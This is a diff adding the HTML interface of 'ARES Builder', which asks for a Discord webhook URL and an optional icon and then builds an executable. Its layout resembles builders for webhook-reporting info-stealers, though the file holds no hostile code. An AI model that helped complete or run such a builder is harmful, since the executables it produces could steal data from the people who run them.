@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>ARES Builder - Discord Bot Builder</title>
+    <link rel="stylesheet" href="style.css" />
+    <script type="text/javascript" src="/eel.js"></script>
+    <style>
+        .title-icon-img {
+            width: 28px;
+            height: 28px;
+            object-fit: contain;
+            display: inline-block;
+            vertical-align: middle;
+        }
+        .title-content { display:flex; align-items:center; gap:8px; }
+        .title-text { font-weight:700; font-size:1rem; }
+        .social-link { text-decoration:none; padding:6px 8px; display:inline-flex; gap:6px; align-items:center; }
+        .input-indicator { width:10px; height:10px; border-radius:50%; background:#ccc; display:inline-block; margin-left:6px; vertical-align:middle; }
+        .build-btn .btn-loading { display:none; } 
+    </style>
+</head>
+<body>
+    <div class="app">
+        <div class="title-bar">
+            <div class="title-content">
+                <img class="title-icon-img" src="https://camo.githubusercontent.com/6fdc437f28d10e685c7efef34d845e82511c8de0ef90452a85ed6ad42343d680/68747470733a2f2f692e696d6775722e636f6d2f4d6577616f67662e706e67" alt="ARES Icon" />
+                <div class="title-text">ARES Builder</div>
+            </div>
+            <div class="title-controls">
+                <button class="control-btn minimize">−</button>
+                <button class="control-btn maximize">□</button>
+                <button class="control-btn close">×</button>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-ascii">
+                        <div class="ascii-line">▄▄▄       ██▀███  ▓█████   ██████</div>
+                        <div class="ascii-line">▒████▄    ▓██ ▒ ██▒▓█   ▀ ▒██    ▒</div>
+                        <div class="ascii-line">▒██  ▀█▄  ▓██ ░▄█ ▒▒███   ░ ▓██▄</div>
+                        <div class="ascii-line">░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒</div>
+                        <div class="ascii-line">▓█   ▓██▒░██▓ ▒██▒░▒████▒▒██████▒▒</div>
+                    </div>
+                </div>
+                <div class="subtitle">Rome wasn't created in a day.</div>
+
+                <!-- Social Links -->
+                <div class="social-links">
+                    <a href="https://github.com/rescore09" target="_blank" class="social-link github">
+                        <span class="social-text">GitHub</span>
+                    </a>
+                    <a href="https://rescore9.vercel.app" target="_blank" class="social-link portfolio">
+                        <span class="social-text">Portfolio</span>
+                    </a>
+                </div>
+            </div>
+
+            <div class="config-section">
+                <div class="section-title">
+                    Configuration
+                </div>
+
+                <div class="input-group">
+                    <label for="webhookUrl">Discord Webhook URL</label>
+                    <div class="input-container">
+                        <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." />
+                        <div class="input-indicator" aria-hidden="true"></div>
+                    </div>
+                </div>
+
+                <div class="checkbox-group">
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="useIcon" />
+                        <label for="useIcon" class="checkbox-label">
+                            <span class="checkmark" aria-hidden="true"></span>
+                            Use Custom Icon
+                        </label>
+                    </div>
+                    <button id="selectIconBtn" class="icon-btn" disabled>
+                        Select Icon
+                    </button>
+                </div>
+
+                <div id="selectedIcon" class="selected-icon" style="display: none;">
+                    <span class="icon-preview" aria-hidden="true"></span>
+                    <span class="icon-name"></span>
+                    <button class="remove-icon">×</button>
+                </div>
+            </div>
+
+            <div class="build-section">
+                <button id="buildBtn" class="build-btn">
+                    <span class="btn-text">Build Executable</span>
+                    <div class="btn-loading">
+                        <div class="spinner"></div>
+                    </div>
+                </button>
+            </div>
+
+            <div class="console-section">
+                <div class="console-header">
+                    <span class="console-title">
+                        Build Console
+                    </span>
+                    <button id="clearConsole" class="clear-btn">Clear</button>
+                </div>
+                <div class="console-output" id="consoleOutput">
+                    <div class="console-line welcome">
+                        <span class="timestamp">[00:00:00]</span>
+                        <span class="message">
+    <strong>[ARES] Current Plan:</strong> Free | 
+    <a href="https://github.com/rescore09/ares" target="_blank">GitHub Repo</a><br>
+    [ARES] Ares Builder ready. Configure your webhook and build!
+</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="status-bar">
+            <div class="status-left">
+                <span class="status-indicator ready"></span>
+                <span id="statusText">Ready</span>
+            </div>
+            <div class="status-right">
+                <span class="version">v1.0.0</span>
+                <span class="developer">by rescore09</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Building executable...</div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
